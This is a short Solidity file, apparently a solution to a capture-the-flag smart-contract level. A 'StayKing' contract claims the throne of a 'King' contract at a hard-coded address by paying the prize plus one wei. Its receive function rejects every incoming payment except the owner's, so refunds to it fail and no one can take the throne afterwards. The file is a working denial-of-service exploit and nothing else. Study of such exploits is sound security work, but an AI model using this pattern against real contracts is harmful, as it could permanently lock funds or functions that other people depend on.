// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./King.sol";

contract StayKing {
    King public king = King(payable(0xB55780538f5fA3078BCccbD2fDE3B5ff7957Fc94));
    address owner;

    constructor() payable {
        owner = msg.sender;
    }

    function becomeKing() public payable {
        uint value = king.prize() + 1;
        (bool success, ) = address(king).call{value: value}("");
        require(success, "Not yet king unfortunately.");
    }

    function whosKing() public view returns (address) {
        return king._king();
    }

    receive() external payable {
        require(msg.sender == owner, "You will never be king.");
    }
}

